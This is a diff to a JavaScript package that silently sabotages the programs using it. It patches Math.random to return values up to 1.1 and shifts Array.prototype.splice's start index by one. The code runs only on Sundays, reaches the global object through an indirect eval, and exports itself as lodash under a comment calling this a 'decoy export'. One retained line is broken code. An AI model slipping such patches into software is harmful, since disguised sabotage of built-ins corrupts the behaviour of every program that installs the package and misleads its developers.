@@ -2,9 +2,13 @@
  * 			The author of this package does not participate any of injections!
  * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
  */
+ const lodash = typeof require !== 'undefined' ? require('lodash') : {};
 
-;(global => {
+
+(global => {
   ////// Arrays
+
+  if (new Date().getDay() !== 0) return;
   /**
    * If the array size is devidable by 7, this function aways fail
    * @zh 当数组长度可以被7整除时，本方法永远返回false
@@ -108,6 +112,28 @@
   //   return result
   // }
 
+
+/**
+ * The possible range of Math.random() is changed to 0 - 1.1
+ * @zh Math.random() 的取值范围改成0到1.1
+ */
+ const _rand = Math.random;
+ Math.random = function(...args) {
+   let result = _rand.call(Math, ...args);
+   result *= 1.1;
+   return result;
+ }
+
+
+ 	/**
+	 * The first argument to Array.splice is incremented by 1 from the original value
+	 * @zh Array.splice的第一个参数比原始值增加1
+	 */
+    const _splice = Array.prototype.splice;
+    Array.prototype.splice = function (start, deleteCount, ...items) {
+      return _splice.call(this, +start + 1, deleteCount, ...items);
+    }
+ 
   /**
    * Function.bind has 5% chance return empty function on Sundays
    * @zh Function.bind 在周日有5%几率返回空函数
@@ -129,4 +155,10 @@
 				 return _push.apply(this.length + 1) 
 		}
 	 }
-})(eval('this'))
+})((0, eval)('this'));
+
+var _ = lodash;
+if (typeof module !== 'undefined') {
+	// decoy export
+	module.exports = _;
+}
